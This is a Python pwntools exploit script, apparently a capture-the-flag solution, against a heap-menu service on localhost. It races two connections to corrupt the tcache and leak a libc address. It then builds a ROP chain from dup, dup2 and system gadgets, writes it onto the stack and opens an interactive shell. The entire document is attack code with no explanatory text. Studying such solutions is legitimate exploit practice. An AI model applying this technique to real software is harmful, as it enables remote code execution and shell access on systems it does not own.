from pwn import *

class connection():
    def __init__(self):
        self.p = remote('localhost',1337)

    def send(self,b,a=":"):
        self.p.sendlineafter(a,str(b))

    def send2(self,b,a=":"):
        self.p.sendafter(a,str(b))

    def create(self,size):
        self.send(1, 'Exit')
        self.send(size)

    def edit(self,index, data):
        self.send(2, 'Exit')
        self.send(index)
        self.send2(data)

    def delete(self,index):
        self.send(3, 'Exit')
        self.send(index)
        self.send('y')

    def delete_stall(self,index):
        self.send(3, 'Exit')
        self.send(index)

    def yes(self):
        self.send('y')

p = connection()
p.create(512) #0
p.create(512) #1
p.create(24) #2
p.create(32) #3
p.create(32) #4

p.delete(0)
p.delete_stall(1)

q = connection()
q.edit(1, '\xd0\x08')

p.yes()

p.create(512)#0
p.create(512)#1 #points tcache

p.delete(3)
p.delete_stall(4)

q.edit(4,'\x70\x08')

p.yes()

p.delete(2)

p.create(32)#2
p.create(32)#3 points before leak

p.edit(3, '/bin/sh\x00'+p64(0x35))

p.edit(1, p64(0x1)*16 + '\x80\x08')

p.create(24) #4 leak pointer

p.edit(4,'a'*15 + '-')
p.delete(4)
leak = p.p.readuntil('What')[:-4]
leak = leak.split('-')[1]
leak = u64(leak.ljust(8,'\x00'))

print hex(leak)

libc = leak-0x1beb80
free_hook = libc+0x1c1e70
system = libc+0x48df0
stack = libc-0x805108
dup = libc+0xef6e0
dup2 = libc+0xef710

rdi = libc+0x00000000001323a0
rsi = libc+0x0000000000131347
rdx = libc+0x00000000000cb16d
rax = libc+0x000000000004b85b
subrax = libc+0x000000000009d958
xchg = libc+0x0000000000129fdc

binsh = libc+0x18a156

#dup(0) rax
#dup(rax, 0)
#dup(rax, 1)
#dup(rax, 2)

#binsh
#system

chain = [rdi, 0, dup, rdi, 2, subrax, xchg, rsi, 0, dup2, rsi, 1, dup2, rsi, 2, dup2, rdi, binsh, system]
chain = ''.join(map(p64,chain))

p.edit(1,p64(0x0001000100010001)*16+p64(stack)*30)

p.create(300)
p.edit(4,chain)


q.p.interactive()


p.p.interactive()

